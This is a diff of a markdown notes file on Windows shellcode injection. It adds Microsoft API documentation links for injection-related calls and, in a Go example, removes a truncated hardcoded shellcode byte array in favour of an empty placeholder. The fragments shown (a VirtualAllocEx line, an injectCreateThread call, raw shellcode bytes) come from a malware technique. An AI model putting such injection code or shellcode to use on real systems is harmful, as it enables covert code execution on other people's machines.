@@ -327,15 +327,15 @@ VirtualAllocEx(processHandle, NULL, $shellcode_size, MEM_COMMIT, PAGE_READWRITE)
 ```
 
 
-[WriteProcessMemory]
-[VirtualProtect]
-[CreateThread]
-[Process32First]
-[CloseHandle]
+[WriteProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)
+[VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
+[CreateThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread)
+[Process32First](https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32first)
+[CloseHandle](https://learn.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-closehandle)
 [WaitForSingleObject](https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject)
 
-[GetCurrentProcess]
-[OpenProcess]
+[GetCurrentProcess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentprocess)
+[OpenProcess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess)
 
 C version - notes
 ```c
@@ -439,10 +439,9 @@ func injectCreateThread(shellcode []byte) error {
 
 func main() {
 	// Replace the shellcode with your own code
-	shellcode := []byte{
-		0xd9, 0xeb, 0x9b, 0xd9, 0x74, 0x24, 0xf4, 0x31, 0xd2, 0xb2, 0x77, 0x31, 0xc9,
-		0x64, 0x8b, 0x71, 0x30, 0x8b, 0x76, 0x0c, 0x8b, 0x76, 0x1c, 0x8b, 0x6e, 0
-
+	shellcode := []byte{}
+	injectCreateThread(shellcode)
+	}
 
 ```
 
